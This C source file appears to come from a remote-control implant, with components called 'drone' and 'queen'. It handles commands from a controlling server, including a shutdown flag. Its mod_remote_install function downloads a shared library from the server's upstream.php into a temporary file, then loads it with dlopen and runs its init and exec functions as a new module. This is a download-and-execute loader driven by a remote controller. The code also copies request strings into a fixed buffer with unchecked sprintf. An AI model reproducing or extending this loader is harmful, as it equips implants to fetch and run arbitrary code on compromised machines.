#include <dlfcn.h> 
#include "common.h"
#include <string.h> 
#include <stdint.h> 
#include "cJSON.h"
#include <unistd.h>
#include "hyp_conn_queen.h"
#include "hyp_stream_queue.h"
#include "exec_thread.h"
#include "hyp_mod_func.h"

int mod_drone(const char *buff){
	REQUEST_HEADER * Buf = (REQUEST_HEADER *)buff;

    cJSON * jsonRoot = 0;
    
	char result[6] = {0x24, 0x63, 0x3D, 0x31, 0x04,0x00};
    
    if (Buf->lpJsonRoot){		 		
		jsonRoot = Buf->lpJsonRoot;

		cJSON * data = cJSON_GetObjectItem(jsonRoot,"shutdown");
		if ((data)&&(data->valuestring)){
			result[3] = 0x32;
		}	
    }
    response_sender(Buf, 6, (char *)&result);

    if (0x32 == result[3]){
		sleep (3);
		DroneStatus = -9;
    }
	return 0;
}

int mod_remote_install(const char *buff){
    REQUEST_HEADER * Buf = (REQUEST_HEADER *)buff;

    debug_msg ("Mod.exec: request len: %i contents: %s  addr: %p \n",Buf->RDataSize,(char *)Buf->RData,Buf->RData);
	debug_msg ("Mod.exec: request ID: %.*s \n",32,Buf->Tid);
	debug_msg ("Mod.exec: ExecFunc: %p \n",Buf->ExecCallFunc);
	debug_msg ("Mod.exec: cJSON_GetObjectItem: %p \n",Buf->cJSON_GetObjectItem);
	debug_msg ("Mod.exec: lpJsonRoot: %p \n",Buf->lpJsonRoot);

    char * lp_new_mid = 0;
	char * lp_os      = 0;
    char * lp_custom_mid = 0;
    //char result[41] = {0x24,0x72, 0x3D, 0x31, 0x04}; //$r=1 $m=

	char result[41] = {
		0x24, 0x72, 0x3D, 0x31, 0x04, 0x24, 0x6D, 0x3D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
     };

     char buf[1024];

    cJSON * jsonRoot = 0;
	
    cJSON * (* cJSON_GetObjectItem) (cJSON *object,const char *string);
    cJSON_GetObjectItem = Buf->cJSON_GetObjectItem;
    if (Buf->lpJsonRoot){		 		
		jsonRoot = Buf->lpJsonRoot;

		cJSON * data = cJSON_GetObjectItem(jsonRoot,"new_mid");
		if ((data)&&(data->valuestring)){
			lp_new_mid = data->valuestring;

			data = cJSON_GetObjectItem(jsonRoot,"os");
			if ((data) && (data->valuestring)){
				lp_os = data->valuestring;

				sprintf (buf,"%s""upstream.php?mid=%s&os=%s",QueenHostDir,lp_new_mid,lp_os);

			    debug_msg ("*** new mid: %s os: %s url:%s\n",lp_new_mid,lp_os,buf);
			}		
		}else {		
		    data = cJSON_GetObjectItem(jsonRoot,"_FILES");
			if (data){
				data = data->child;
				cJSON * uploadTmp = 0;
				if (data){				
					 uploadTmp = cJSON_GetObjectItem(data,"size");
                     if (uploadTmp->valueint){
						 debug_msg ("upload size: %i \n",uploadTmp->valueint);
						 
						 data = cJSON_GetObjectItem(data,"name");

						 if (data->valuestring){
							 lp_custom_mid = data->valuestring;
							 sprintf (buf,"%s""upstream.php?tid=%.*s",QueenHostDir,32,Buf->Tid);
						     debug_msg ("*** new mid (Custom): url:%s\n",buf);
						 }										 
					 }
				}
			}                                         
		}
		
	}

    if (((lp_new_mid) && (lp_os)) || (lp_custom_mid)){

		result[3] = 0x32;

        char newMid[32] = {0};

		char * tmpFileName = tempnam(0,0);
		if (tmpFileName){
			debug_msg ("Temporary file name is: %s\n",tmpFileName);			

			FILE * handle = fopen(tmpFileName,"wb");
			if (handle){	
				result[3] = 0x33;
				HYP_CONN_QUEEN_SOCKET send_hcqs;
				if (0 == hyp_conn_queen_init(buf,0,0,&send_hcqs,1,QueenSSL_nonBlock)){
					int i = 1;
					do{
						i = hyp_conn_queen_read(&send_hcqs,(char *)&buf,1024,QueenSSL_nonBlock);
						if (i > 0){
							fwrite (buf , sizeof(char), i, handle);
						}
						debug_msg ("i = %i\n",i);
					}while (i > 0);
					hyp_conn_queen_close(&send_hcqs);
				}
				fclose(handle);
				int a = mod_loc_loader(tmpFileName,(char *)&newMid);
				strncat(result,newMid,32);

				debug_msg ("Load new mod result: %d, name: %s\n",a,newMid);
				
				if (0 == a){
					result[3] = 0x30;
				}else if (1 == a){
					result[3] = 0x36;
				}else if(2 == a){ // mod exists,still notify Queen
					result[3] = 0x35;
				}else{
					result[3] = 0x34;
				}
			}
			unlink(tmpFileName);
			free (tmpFileName);
		}else{
			debug_msg ("fail: Temporary file name return 0 \n");
		}

	    result[40] = 0x04;

	}
	
    response_sender(Buf, 41, (char *)&result);

	return 0;
}

void * pos_modulelist(MODULE_LIST * moduleList,uint32_t * mid){
	void * ret = 0;
    while ((0 != moduleList->Module_NO[0]) || (0 != moduleList->Module_NO[1]) || (0 != moduleList->Module_NO[2]) || 
		   (0 != moduleList->Module_NO[3])){
		if (0 == memcmp(&(moduleList->Module_NO[0]),mid,16)){
			ret = moduleList->Module_Func;
			break;
		}
		moduleList ++;             		
	}
	return ret;
}

int mod_loc_loader(char * soName,char * soMid){
	int ret = -1;
	char *error;
    void * (*init) (char *);
	void * funcAddr = 0;
	void * notifyAddr = 0;
	uint32_t mid[4];
	void * handle = dlopen (soName, RTLD_LAZY);  
	if (handle) {    
		init = dlsym(handle, "init");  
		if ((error = dlerror()) != NULL)  {  
			dlclose(handle);			
		}else{
			funcAddr = dlsym(handle, "exec");  
			if ((error = dlerror()) != NULL)  {  
				dlclose(handle);
			}else{				
				notifyAddr = dlsym(handle,"notify");

				void * j = init ((char *)mid);
				if (0 == j){					
					if (soMid){ //ret Module's ID
						char * tmp = (char *) &mid;
						sprintf(soMid,"%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X",tmp[0],tmp[1],tmp[2],tmp[3],tmp[4],tmp[5],tmp[6],tmp[7],
 	                                                                                                tmp[8],tmp[9],tmp[10],tmp[11],tmp[12],tmp[13],tmp[14],tmp[15]);
					}
					ret = mod_insert_list(DroneModuleList,(uint32_t *)&mid,funcAddr,notifyAddr,handle);
					if (1 == ret){
						ret = 2;
					}
				}else if ((void *)-1 == j){ //reject load
                    ret = -1;
				}else{
				    DroneStatus = -9;
					newDroneModuleList = j;
                    newDroneExec = * ((void **)&mid);
					ret = 1;
				}
			}
		}
	}
	return ret;
}

int mod_close(MODULE_LIST * moduleList){
	void (*notify) (uint32_t); 
	while (moduleList->Module_Func){
		debug_msg ("module closeing...Module_Func,%p \n",moduleList->Module_Func);
		moduleList->Module_NO[0] = 0;
		moduleList->Module_NO[1] = 0;
		moduleList->Module_NO[2] = 0;
		moduleList->Module_NO[3] = 0;
		if (moduleList->Module_Notify){
			debug_msg ("module closeing...notify,%p \n",moduleList->Module_Notify);
			
			notify = moduleList->Module_Notify;
			notify (1);            
		}
		if (moduleList->Module_Base){
			#ifdef DEBUG
			    int i = dlclose(moduleList->Module_Base);
			    debug_msg ("module closeing...dlclose,%p,ret: %i \n",moduleList->Module_Base,i);
			#else
				dlclose(moduleList->Module_Base);
			#endif
		}		
	    moduleList ++;
	}
    return 0;

}

//-1 fail; 0 success; 1 exists already
int mod_insert_list(MODULE_LIST * moduleList,uint32_t * mid,void * funcAddr,void * notifyAddr,void * baseAddr){
	int ret = -1;

	if (mod_seek((char *)mid)){ // mid exists already
	    ret = 1;
	}else{
		size_t remained = DroneModuleListBuffSize;
		while (remained > sizeof(moduleList)){
			if ((0 == moduleList->Module_Func) \
				&& (0 == moduleList->Module_NO[0]) && (0 == moduleList->Module_NO[1]) \
				&& (0 == moduleList->Module_NO[2]) && (0 == moduleList->Module_NO[3])){
				memcpy(moduleList,mid,4*4);
				moduleList->Module_Func = funcAddr;
				moduleList->Module_Base = baseAddr;
				moduleList->Module_Notify = notifyAddr;
				debug_msg ("new Mod_insert_list : funcAddr %p , baseAddr %p , notifyAddr %p \n",funcAddr,baseAddr,notifyAddr);
				ret = 0;
				break;
			}
			remained -= sizeof(moduleList);
			moduleList ++;
		}
	}
	return ret;

}

MODULE_LIST * mod_seek(char * mid){
    MODULE_LIST * ret = 0;
    MODULE_LIST * c_ModuleList = DroneModuleList;
	while ((0 != c_ModuleList->Module_NO[0]) || (0 != c_ModuleList->Module_NO[1]) || (0 != c_ModuleList->Module_NO[2]) || 
		   (0 != c_ModuleList->Module_NO[3])){
		if (0 == memcmp(&(c_ModuleList->Module_NO[0]),mid,16)){	
			ret = c_ModuleList;
			break;
		}
		c_ModuleList ++;             
	}
	return ret;

}